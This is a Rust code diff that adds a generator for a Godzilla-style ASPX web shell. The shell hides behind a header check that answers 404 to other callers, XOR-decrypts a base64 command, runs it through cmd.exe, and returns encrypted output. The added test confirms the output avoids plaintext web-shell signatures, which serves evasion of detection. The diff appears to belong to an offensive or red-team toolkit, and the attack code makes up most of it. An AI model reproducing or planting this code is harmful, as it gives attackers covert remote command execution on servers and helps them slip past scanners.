@@ -267,6 +267,42 @@ pub fn jsp_channel_template(derived: &DerivedChannel) -> String {
     .join("\n")
 }
 
+/// Plant (ASPX): the godzilla-shape channel rendered for a .NET target —
+/// header gate + pass parameter + stream-cipher body + sandwich echo.
+/// C# surface: Convert.FromBase64String, XOR loop, Process.Start with
+/// redirected stdout, sandwich echo via Response.Write.
+pub fn aspx_channel_template(derived: &DerivedChannel) -> String {
+    [
+        "<%@ Page Language=\"C#\" %>".to_string(),
+        "<%".to_string(),
+        "using System.Diagnostics;".to_string(),
+        "using System.Text;".to_string(),
+        format!(
+            "string h=\"{}\",v=\"{}\",p=\"{}\";",
+            derived.header_name, derived.header_value, derived.pass
+        ),
+        "if(Request.Headers[h]==null||!Request.Headers[h].Equals(v)){Response.StatusCode=404;return;}"
+            .to_string(),
+        format!("string k=\"{}\";", derived.md5_key),
+        "byte[] s=Convert.FromBase64String(Request.Form[p]);".to_string(),
+        "byte[] o=new byte[s.Length];".to_string(),
+        "for(int i=0;i<s.Length;i++){o[i]=(byte)(s[i]^k[i%k.Length]);}".to_string(),
+        "string cmd=Encoding.UTF8.GetString(o);".to_string(),
+        "var si=new ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);".to_string(),
+        "si.RedirectStandardOutput=true;si.UseShellExecute=false;".to_string(),
+        "byte[] r=Encoding.UTF8.GetBytes(Process.Start(si).StandardOutput.ReadToEnd());".to_string(),
+        "byte[] e=new byte[r.Length];".to_string(),
+        "for(int i=0;i<r.Length;i++){e[i]=(byte)(r[i]^k[i%k.Length]);}".to_string(),
+        format!(
+            "Response.Write(\"{}\"+Convert.ToBase64String(e)+\"{}\");",
+            &derived.md5[..16],
+            &derived.md5[16..]
+        ),
+        "%>".to_string(),
+    ]
+    .join("\n")
+}
+
 /// The behinder face (Java): the WHOLE request body carries
 /// base64(cipher(class-bytes)) — payload is a class, not command text
 /// (MemShellParty Behinder.java dissected: defineClass on decrypt).
@@ -471,6 +507,25 @@ mod jsp_behinder_tests {
         assert!(template.contains('^')); // XOR loop present
         assert!(!template.contains("system("));
         assert!(!template.contains("<%Runtime")); // composed, not literal
+    }
+
+    #[test]
+    fn aspx_template_gates_on_header_and_ciphers() {
+        let cfg = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-Forwarded-For".into(),
+            header_value: "10.0.0.1".into(),
+        };
+        let derived = cfg.derive();
+        let template = aspx_channel_template(&derived);
+        assert!(template.contains("Request.Headers[h]"));
+        assert!(template.contains("StatusCode=404"));
+        assert!(template.contains("^")); // XOR loop present
+        assert!(template.contains("Convert.FromBase64String"));
+        // Shell-syntax signatures absent (the plaintext one-liner face):
+        assert!(!template.contains("Request[\"cmd\"]"));
+        assert!(!template.contains("cmd.exe\",\"/c \"+Request"));
     }
 
     #[test]
